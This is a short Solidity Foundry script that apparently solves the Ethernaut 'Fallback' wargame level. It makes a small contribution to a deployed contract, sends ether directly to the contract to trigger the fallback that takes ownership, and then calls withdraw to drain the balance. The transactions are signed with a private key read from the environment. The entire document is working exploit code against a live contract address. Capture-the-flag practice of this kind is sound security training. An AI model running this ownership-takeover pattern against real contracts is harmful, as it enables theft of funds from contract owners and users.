// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    
    address payable target = payable(0xeB835Aa42DBD2126AB33D2ADA474436bA5523D6C);
    Fallback fallbackInstance = Fallback(target);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 0.0005 ether}();
        uint256 contributions = fallbackInstance.getContribution();
        console.log("Contribution for the sender:", contributions);

        address(fallbackInstance).call{value: 0.0005 ether}("");
        console.log("Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        fallbackInstance.withdraw();        
        
        vm.stopBroadcast();
    }

    
}